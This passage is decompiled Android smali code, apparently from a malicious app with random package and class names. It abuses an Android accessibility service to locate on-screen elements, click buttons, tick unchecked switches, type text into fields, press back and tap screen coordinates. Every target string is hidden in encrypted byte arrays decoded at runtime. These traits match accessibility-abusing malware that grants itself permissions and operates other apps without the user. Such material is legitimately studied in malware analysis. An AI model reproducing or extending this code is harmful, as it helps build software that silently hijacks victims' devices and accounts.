    const/16 v8, 0x10

    invoke-virtual {v7, v8}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    goto :goto_1

    :cond_1
    new-array v5, v2, [B

    fill-array-data v5, :array_16

    new-array v6, v3, [B

    fill-array-data v6, :array_17

    invoke-static {v5, v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v5

    sput-object v5, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->C:Ljava/lang/String;

    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->V2()V

    :cond_2
    add-int/lit8 v4, v4, 0x1

    goto :goto_0

    :cond_3
    return-void

    :array_0
    .array-data 1
        -0x51t
        0x11t
        -0x33t
        -0x36t
        0x4bt
        0x14t
    .end array-data

    nop

    :array_1
    .array-data 1
        0x46t
        -0x7bt
        0x4ct
        0x2ft
        -0x1bt
        -0x72t
        -0x45t
        0x11t
    .end array-data

    :array_2
    .array-data 1
        0x5ft
        -0x3bt
        -0x45t
        -0x5ct
        0x44t
        -0x65t
    .end array-data

    nop

    :array_3
    .array-data 1
        -0x4at
        0x4bt
        0x2dt
        0x41t
        -0x16t
        0x1t
        0x1dt
        -0x73t
    .end array-data

    :array_4
    .array-data 1
        -0x43t
        -0xdt
        0x1bt
        -0x40t
    .end array-data

    :array_5
    .array-data 1
        -0xft
        -0x64t
        0x78t
        -0x55t
        0x7t
        -0x4dt
        -0x3bt
        0x9t
    .end array-data

    :array_6
    .array-data 1
        -0x2t
        0x1ct
        0x1dt
        -0x3t
        0x62t
        0x37t
        0x4ct
        -0x19t
        -0x4et
    .end array-data

    nop

    :array_7
    .array-data 1
        0x1dt
        -0x61t
        -0x50t
        0x1et
        -0x1ft
        -0x4ct
        -0x51t
        0x65t
    .end array-data

    :array_8
    .array-data 1
        -0x78t
        0x3et
        -0x12t
        0x3ct
        -0x72t
        -0x62t
        -0x4ct
        -0x46t
        -0x4et
        0x3at
        -0x5t
        0x2bt
    .end array-data

    :array_9
    .array-data 1
        -0x22t
        0x5bt
        -0x64t
        0x4et
        -0x1ft
        -0x15t
        -0x23t
        -0x2at
    .end array-data

    :array_a
    .array-data 1
        -0x47t
        -0x3t
        0x10t
        0x29t
        -0x8t
    .end array-data

    nop

    :array_b
    .array-data 1
        -0xet
        -0x78t
        0x7et
        0x4at
        -0x6ft
        -0x5ct
        0x75t
        0x34t
    .end array-data

    :array_c
    .array-data 1
        0x7bt
        0x26t
        0x79t
        -0x16t
        0x4dt
    .end array-data

    nop

    :array_d
    .array-data 1
        0x30t
        0x4et
        -0x46t
        0x59t
        0x2ct
        0x14t
        -0x35t
        -0x6dt
    .end array-data

    :array_e
    .array-data 1
        -0x5at
        -0x41t
        -0x2ft
        0x12t
        0x14t
        0x42t
        -0x4at
        -0x5ct
        -0x5at
        -0x6at
        -0x30t
        0x29t
        -0x16t
    .end array-data

    nop

    :array_f
    .array-data 1
        0x76t
        0x2et
        0x1t
        -0x57t
        -0x3ct
        -0x4t
        0x66t
        0x1et
    .end array-data

    :array_10
    .array-data 1
        0xdt
        0x16t
        -0xdt
        0x4ct
        -0x43t
        -0x37t
    .end array-data

    nop

    :array_11
    .array-data 1
        -0x1ft
        -0x78t
        0x53t
        -0x5at
        0x5t
        0x41t
        -0x7at
        -0x76t
    .end array-data

    :array_12
    .array-data 1
        0x18t
        -0x12t
        0x45t
        0x4t
        0x3t
        0x36t
        0x27t
        -0xft
        0x55t
        -0x4at
        0x58t
        0x65t
    .end array-data

    :array_13
    .array-data 1
        -0x8t
        0x56t
        -0x20t
        -0x1ct
        -0x46t
        -0x4ft
        -0x39t
        0x49t
    .end array-data

    :array_14
    .array-data 1
        0x63t
        -0x4t
        0x6et
        -0x39t
        -0x19t
        0x21t
    .end array-data

    nop

    :array_15
    .array-data 1
        0x2at
        -0x2ft
        0x2t
        -0x58t
        -0x7ct
        0x4at
        0x66t
        0x15t
    .end array-data

    :array_16
    .array-data 1
        -0x17t
        0xdt
        0x3ft
        -0x6ct
    .end array-data

    :array_17
    .array-data 1
        -0x26t
        0x38t
        0xft
        -0x5ct
        -0x76t
        0x5ft
        0x42t
        -0x7ft
    .end array-data
.end method

.method private static synthetic N2()V
    .locals 0

    .line 1
    return-void
.end method

.method public static synthetic O(Z)V
    .locals 0

    .line 1
    invoke-static {p0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->Y1(Z)V

    return-void
.end method

.method private static O0()V
    .locals 5

    .line 1
    const/4 v0, 0x1

    sput-boolean v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->m:Z

    const/16 v0, 0x10

    :try_start_0
    new-array v0, v0, [B

    fill-array-data v0, :array_0

    const/16 v1, 0x8

    new-array v2, v1, [B

    fill-array-data v2, :array_1

    invoke-static {v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->f3(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    if-eqz v0, :cond_5

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v2

    const/4 v3, 0x2

    if-le v2, v3, :cond_5

    invoke-interface {v0, v3}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-eqz v0, :cond_4

    sget v2, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v3, 0x1e

    if-gt v2, v3, :cond_0

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    :goto_0
    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->U0(Landroid/view/accessibility/AccessibilityNodeInfo;)Z

    move-result v0

    goto :goto_1

    :catch_0
    move-exception v0

    goto :goto_3

    :cond_0
    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    goto :goto_0

    :goto_1
    if-nez v0, :cond_6

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    sget-object v2, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/qq;->f:Ljava/lang/String;

    invoke-static {v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->c(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_1

    new-instance v1, Lcom/vknnolqo/p9sv5zvf/JQgPaybB$l;

    invoke-direct {v1}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB$l;-><init>()V

    invoke-static {v0, v1}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->L0(Landroid/view/accessibility/AccessibilityNodeInfo;Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ui;)V

    goto :goto_4

    :cond_1
    const/16 v0, 0x18

    new-array v0, v0, [B

    fill-array-data v0, :array_2

    new-array v1, v1, [B

    fill-array-data v1, :array_3

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->f3(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    if-eqz v0, :cond_3

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v1

    const/4 v2, 0x0

    :goto_2
    if-ge v2, v1, :cond_6

    add-int/lit8 v3, v1, -0x1

    sub-int/2addr v3, v2

    invoke-interface {v0, v3}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->isChecked()Z

    move-result v4

    if-nez v4, :cond_2

    invoke-static {v3}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->I0(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    :cond_2
    add-int/lit8 v2, v2, 0x1

    goto :goto_2

    :cond_3
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->Y2()V

    goto :goto_4

    :cond_4
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->Y2()V

    return-void

    :cond_5
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->Y2()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return-void

    :goto_3
    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V

    :cond_6
    :goto_4
    return-void

    nop

    :array_0
    .array-data 1
        -0x47t
        0x4dt
        0x62t
        0x7t
        0x7at
        -0x9t
        -0x52t
        0xft
        -0x4ft
        0x47t
        0x29t
        0x1t
        0x7ct
        -0x16t
        -0x5at
        0x50t
    .end array-data

    :array_1
    .array-data 1
        -0x28t
        0x23t
        0x6t
        0x75t
        0x15t
        -0x62t
        -0x36t
        0x35t
    .end array-data

    :array_2
    .array-data 1
        -0x3ft
        -0x2bt
        -0x36t
        0x15t
        -0x4bt
        -0x66t
        -0x33t
        0x4at
        -0x37t
        -0x21t
        -0x7ft
        0x14t
        -0x53t
        -0x66t
        -0x23t
        0x13t
        -0x38t
        -0x1ct
        -0x27t
        0xet
        -0x42t
        -0x6ct
        -0x34t
        0x4t
    .end array-data

    :array_3
    .array-data 1
        -0x60t
        -0x45t
        -0x52t
        0x67t
        -0x26t
        -0xdt
        -0x57t
        0x70t
    .end array-data
.end method

.method private static O1(Ljava/util/List;)V
    .locals 4

    .line 1
    const/16 v0, 0x10

    const/16 v1, 0x8

    const/4 v2, 0x0

    if-eqz p0, :cond_1

    invoke-interface {p0}, Ljava/util/List;->isEmpty()Z

    move-result v3

    if-nez v3, :cond_1

    invoke-interface {p0, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object p0

    check-cast p0, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-eqz p0, :cond_3

    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/a7;->a()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v2

    const/4 v3, 0x6

    new-array v3, v3, [B

    fill-array-data v3, :array_0

    new-array v1, v1, [B

    fill-array-data v1, :array_1

    invoke-static {v3, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v2, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_0

    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v2, 0x20

    if-gt v1, v2, :cond_2

    :cond_0
    new-instance v0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ry;

    invoke-direct {v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ry;-><init>()V

    invoke-static {p0, v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->L0(Landroid/view/accessibility/AccessibilityNodeInfo;Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ui;)V

    goto :goto_0

    :cond_1
    sget-object p0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    const/16 v3, 0x29

    new-array v3, v3, [B

    fill-array-data v3, :array_2

    new-array v1, v1, [B

    fill-array-data v1, :array_3

    invoke-static {v3, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {p0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->d(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Ljava/util/List;

    move-result-object p0

    if-eqz p0, :cond_3

    invoke-interface {p0, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object p0

    check-cast p0, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-eqz p0, :cond_3

    :cond_2
    invoke-virtual {p0, v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    :cond_3
    :goto_0
    const/16 p0, 0x29a

    invoke-static {p0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    return-void

    :array_0
    .array-data 1
        -0x56t
        -0x61t
        0x2ft
        0x7ct
        0x45t
        0x4ft
    .end array-data

    nop

    :array_1
    .array-data 1
        -0x28t
        -0x6t
        0x4et
        0x10t
        0x28t
        0x2at
        -0x16t
        -0x73t
    .end array-data

    :array_2
    .array-data 1
        -0x34t
        -0xft
        0x7et
        -0x3t
        0x5dt
        -0x59t
        0x1bt
        -0x66t
        -0x40t
        -0x9t
        0x77t
        -0x3t
        0x50t
        -0x58t
        0xat
        -0x7at
        -0x34t
        -0xat
        0x76t
        -0x5ft
        0x6t
        -0x60t
        0x1bt
        -0x39t
        -0x40t
        -0x12t
        0x7ft
        -0x5at
        0x4ft
        -0x6at
        0xbt
        -0x77t
        -0x24t
        -0xbt
        0x4ct
        -0x45t
        0x59t
        -0x58t
        0x1bt
        -0x73t
        -0x23t
    .end array-data

    nop

    :array_3
    .array-data 1
        -0x51t
        -0x62t
        0x13t
        -0x2dt
        0x3ct
        -0x37t
        0x7ft
        -0x18t
    .end array-data
.end method

.method private static synthetic O2()V
    .locals 0

    .line 1
    return-void
.end method

.method public static synthetic P()V
    .locals 0

    .line 1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->j2()V

    return-void
.end method

.method private static P0()V
    .locals 6

    .line 1
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    const/16 v1, 0x18

    new-array v1, v1, [B

    fill-array-data v1, :array_0

    const/16 v2, 0x8

    new-array v2, v2, [B

    fill-array-data v2, :array_1

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->d(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    const/4 v1, 0x1

    if-eqz v0, :cond_3

    invoke-interface {v0}, Ljava/util/List;->isEmpty()Z

    move-result v2

    if-nez v2, :cond_3

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v2

    const/4 v3, 0x2

    const/4 v4, 0x0

    if-ne v2, v3, :cond_0

    invoke-interface {v0, v4}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    :goto_0
    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->N0(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    goto :goto_1

    :cond_0
    const/4 v3, 0x3

    if-ne v2, v3, :cond_2

    invoke-interface {v0, v4}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-static {v3}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->N0(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    const/16 v3, 0xc8

    invoke-static {v3}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    :cond_1
    sub-int/2addr v2, v1

    invoke-interface {v0, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    goto :goto_0

    :cond_2
    const/4 v5, 0x4

    if-ne v2, v5, :cond_1

    invoke-interface {v0, v4}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-static {v2}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->N0(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    invoke-interface {v0, v1}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-static {v2}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->N0(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    invoke-interface {v0, v3}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    goto :goto_0

    :goto_1
    const/16 v0, 0x1f4

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    :cond_3
    sput-boolean v1, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->c:Z

    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->i1()V

    return-void

    nop

    :array_0
    .array-data 1
        0x2ct
        -0x4ft
        -0x3dt
        0x35t
        0x41t
        -0x2at
        -0x52t
        -0x3ft
        0x24t
        -0x45t
        -0x78t
        0x34t
        0x59t
        -0x2at
        -0x42t
        -0x68t
        0x25t
        -0x80t
        -0x30t
        0x2et
        0x4at
        -0x28t
        -0x51t
        -0x71t
    .end array-data

    :array_1
    .array-data 1
        0x4dt
        -0x21t
        -0x59t
        0x47t
        0x2et
        -0x41t
        -0x36t
        -0x5t
    .end array-data
.end method

.method private static P1(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)V
    .locals 3

    .line 1
    if-nez p0, :cond_0

    return-void

    :cond_0
    new-instance v0, Landroid/os/Bundle;

    invoke-direct {v0}, Landroid/os/Bundle;-><init>()V

    const/16 v1, 0x25

    new-array v1, v1, [B

    fill-array-data v1, :array_0

    const/16 v2, 0x8

    new-array v2, v2, [B

    fill-array-data v2, :array_1

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1, p1}, Landroid/os/Bundle;->putCharSequence(Ljava/lang/String;Ljava/lang/CharSequence;)V

    const/high16 p1, 0x200000

    invoke-virtual {p0, p1, v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(ILandroid/os/Bundle;)Z

    const/16 p0, 0x64

    invoke-static {p0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    return-void

    :array_0
    .array-data 1
        0x32t
        0x60t
        0x4ct
        -0x31t
        0x5t
        0x2ct
        -0x66t
        0x48t
        0x21t
        0x64t
        0x4dt
        -0x35t
        0xft
        0x2ct
        -0x6ft
        0x56t
        0x20t
        0x66t
        0x4ct
        -0x27t
        0x1et
        0x27t
        -0x63t
        0x5dt
        0x2ct
        0x60t
        0x50t
        -0x39t
        0x18t
        0x31t
        -0x80t
        0x58t
        0x26t
        0x66t
        0x56t
        -0x3bt
        0xft
    .end array-data

    nop

    :array_1
    .array-data 1
        0x73t
        0x23t
        0x18t
        -0x7at
        0x4at
        0x62t
        -0x3bt
        0x9t
    .end array-data
.end method

.method private static synthetic P2()V
    .locals 4

    .line 1
    const/4 v0, 0x0

    move v1, v0

    :goto_0
    const/4 v2, 0x2

    if-ge v1, v2, :cond_0

    :try_start_0
    sget-object v2, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    const/4 v3, 0x1

    invoke-virtual {v2, v3}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    const-wide/16 v2, 0x1f4

    invoke-static {v2, v3}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1

    :catch_0
    move-exception v2

    invoke-virtual {v2}, Ljava/lang/Throwable;->printStackTrace()V

    :goto_1
    add-int/lit8 v1, v1, 0x1

    goto :goto_0

    :cond_0
    sget-object v1, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->B:[Ljava/lang/String;

    array-length v2, v1

    if-lez v2, :cond_5

    aget-object v1, v1, v0

    sget-object v2, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    invoke-static {v2, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->c(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    if-eqz v1, :cond_4

    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    if-eqz v2, :cond_4

    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    invoke-static {v1}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->U0(Landroid/view/accessibility/AccessibilityNodeInfo;)Z

    move-result v1

    if-eqz v1, :cond_5

    const/16 v1, 0x3e8

    invoke-static {v1}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    sget-object v1, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    const/16 v2, 0x25

    new-array v2, v2, [B

    fill-array-data v2, :array_0

    const/16 v3, 0x8

    new-array v3, v3, [B

    fill-array-data v3, :array_1

    invoke-static {v2, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->d(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Ljava/util/List;

    move-result-object v1

    if-eqz v1, :cond_3

    invoke-interface {v1}, Ljava/util/List;->isEmpty()Z

    move-result v2

    if-nez v2, :cond_3

    invoke-interface {v1, v0}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v1

    const/4 v2, 0x3

    if-lt v1, v2, :cond_2

    sub-int/2addr v1, v2

    invoke-virtual {v0, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_1

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->I0(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    const/16 v0, 0x1f4

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    const/16 v0, 0xa

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->M1(I)V

    goto :goto_2

    :cond_1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->j1()V

    return-void

    :cond_2
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->j1()V

    return-void

    :cond_3
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->j1()V

    return-void

    :cond_4
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->j1()V

    :cond_5
    :goto_2
    return-void

    :array_0
    .array-data 1
        -0x3ft
        -0x5bt
        -0x77t
        -0x10t
        -0xdt
        0x2et
        0x66t
        -0x64t
        -0x33t
        -0x5dt
        -0x80t
        -0x10t
        -0x1ft
        0x25t
        0x76t
        -0x66t
        -0x35t
        -0x5ct
        -0x7dt
        -0x53t
        -0x58t
        0x29t
        0x66t
        -0x3ft
        -0x30t
        -0x51t
        -0x79t
        -0x59t
        -0xft
        0x2ct
        0x67t
        -0x64t
        -0x3t
        -0x44t
        -0x73t
        -0x45t
        -0x1bt
    .end array-data

    nop

    :array_1
    .array-data 1
        -0x5et
        -0x36t
        -0x1ct
        -0x22t
        -0x6et
        0x40t
        0x2t
        -0x12t
    .end array-data
.end method

.method public static synthetic Q(Landroid/os/Handler;)V
    .locals 0

    .line 1
    invoke-static {p0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->c2(Landroid/os/Handler;)V

    return-void
.end method

.method private static Q0(Landroid/view/accessibility/AccessibilityNodeInfo;)V
    .locals 7

    .line 1
    if-nez p0, :cond_0

    return-void

    :cond_0
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->isCheckable()Z

    move-result v0

    const/4 v1, 0x0

    if-eqz v0, :cond_1

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->isChecked()Z

    move-result v0

    if-eqz v0, :cond_1

    const/4 v0, 0x1

    goto :goto_0

    :cond_1
    move v0, v1

    :goto_0
    if-nez v0, :cond_3

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getContentDescription()Ljava/lang/CharSequence;

    move-result-object v2

    if-eqz v2, :cond_3

    sget-object v3, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->x:[Ljava/lang/String;

    array-length v4, v3

    :goto_1
    if-ge v1, v4, :cond_3

    aget-object v5, v3, v1

    invoke-interface {v2}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v6, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_2

    goto :goto_2

    :cond_2
    add-int/lit8 v1, v1, 0x1

    goto :goto_1

    :cond_3
    if-eqz v0, :cond_4

    :goto_2
    new-instance v0, Landroid/graphics/Rect;

    invoke-direct {v0}, Landroid/graphics/Rect;-><init>()V

    invoke-virtual {p0, v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getBoundsInScreen(Landroid/graphics/Rect;)V

    invoke-virtual {v0}, Landroid/graphics/Rect;->centerX()I

    move-result v1

    invoke-virtual {v0}, Landroid/graphics/Rect;->centerY()I

    move-result v0

    invoke-static {v1, v0}, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->z(II)Z

    const/16 v0, 0x1f4

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    :cond_4
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V

    return-void
.end method

.method private static Q1(Ljava/lang/String;)V
    .locals 1

    .line 1
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

